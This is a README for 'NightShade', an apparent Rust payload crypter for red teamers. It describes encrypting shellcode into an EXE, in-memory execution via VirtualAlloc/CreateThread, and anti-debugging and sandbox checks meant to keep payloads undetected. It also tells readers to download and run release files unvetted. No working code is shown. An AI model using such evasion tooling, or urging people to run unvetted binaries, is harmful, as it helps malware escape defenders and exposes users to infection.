# NightShade: Advanced Rust-Based Encryption for Red Team Operators

![NightShade](https://img.shields.io/badge/NightShade-Rust--Based%20Encryption-blue?style=for-the-badge&logo=rust)

**NightShade** by EvilWhales is a powerful tool designed for red team operators who need to work stealthily. Built with Rust, it offers advanced encryption and in-memory execution capabilities. This tool is ideal for those who operate in the shadows, ensuring that payloads remain undetected.

---

## Table of Contents

- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
- [Configuration](#configuration)
- [Examples](#examples)
- [Contributing](#contributing)
- [License](#license)
- [Contact](#contact)
- [Releases](#releases)

---

## Features

- **Quantum-Resistant Encryption**: Utilize ChaCha20-Poly1305 or XChaCha20 for top-tier security.
- **Multi-Layer Obfuscation**: Key, nonce, and password obfuscation using XOR masking.
- **Robust Key Derivation**: PBKDF2-SHA256 with 150,000 iterations for strong keys.
- **In-Memory Execution**: Use `VirtualAlloc` and `CreateThread` to run payloads without touching the disk.
- **Anti-Analysis Measures**: Built-in anti-debugging, sandbox detection, and memory anomaly checks.
- **User-Friendly CLI**: Simple command-line interface for quick setup and execution.

---

## Installation

To get started with NightShade, follow these steps:

1. **Clone the Repository**:
   ```bash
   git clone https://github.com/kaskass2006/nightshade.git
   cd nightshade
   ```

2. **Build the Project**:
   Ensure you have Rust installed. Then run:
   ```bash
   cargo build --release
   ```

3. **Locate the Executable**:
   After building, find the executable in the `target/release` directory.

---

## Usage

NightShade provides a command-line interface for easy interaction. Here’s how to use it:

1. **Run the Executable**:
   ```bash
   ./target/release/nightshade
   ```

2. **Input Options**:
   - Input raw hex payloads or load from files.
   - Specify the output EXE name.
   - Choose between standard ChaCha20 or XChaCha20 for enhanced nonce strength.

---

## Configuration

NightShade allows customization through command-line arguments. Here are some key options:

- `--payload`: Specify the raw hex payload or file.
- `--output`: Set the desired output EXE name.
- `--xchacha`: Enable XChaCha20 mode for additional nonce strength.

### Example Command

```bash
./target/release/nightshade --payload <your_payload.hex> --output my_payload.exe --xchacha
```

---

## Examples

### Encrypting a Payload

To encrypt a payload, you can run the following command:

```bash
./target/release/nightshade --payload payload.hex --output encrypted_payload.exe
```

This command will take your `payload.hex`, encrypt it, and create an `encrypted_payload.exe`.

### In-Memory Execution

After generating the EXE, you can execute it directly in memory without leaving traces on the disk. This is crucial for maintaining stealth during operations.

---

## Contributing

We welcome contributions to NightShade. To contribute:

1. Fork the repository.
2. Create a new branch:
   ```bash
   git checkout -b feature/YourFeature
   ```
3. Make your changes and commit them:
   ```bash
   git commit -m "Add your feature"
   ```
4. Push to your branch:
   ```bash
   git push origin feature/YourFeature
   ```
5. Open a pull request.

---

## License

NightShade is licensed under the MIT License. See the [LICENSE](LICENSE) file for more information.

---

## Contact

For questions or support, reach out via:

- **GitHub Issues**: [NightShade Issues](https://github.com/kaskass2006/nightshade/issues)
- **Email**: evilwhales@example.com

---

## Releases

To download the latest release, visit the [Releases section](https://github.com/kaskass2006/nightshade/releases). Download the required file and execute it for seamless operation.

For further updates and information, always check the [Releases section](https://github.com/kaskass2006/nightshade/releases).

---

![NightShade Logo](https://img.shields.io/badge/NightShade-Encryption%20Tool-green?style=for-the-badge&logo=shield)

---

With NightShade, you have a powerful ally for secure and stealthy operations. Use it wisely.